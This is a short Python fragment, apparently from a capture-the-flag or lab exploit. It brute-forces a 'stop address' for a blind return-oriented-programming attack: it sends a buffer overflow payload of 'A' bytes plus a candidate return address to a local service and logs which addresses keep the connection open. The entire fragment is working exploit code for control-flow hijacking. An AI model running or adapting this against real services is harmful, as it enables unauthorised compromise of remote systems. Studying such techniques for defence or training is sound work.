def get_stop_addr(buf_size):
    addr = 0x400000
    while True:
        sleep(0.1)
        addr += 1
        payload  = "A"*buf_size
        payload += p64(addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1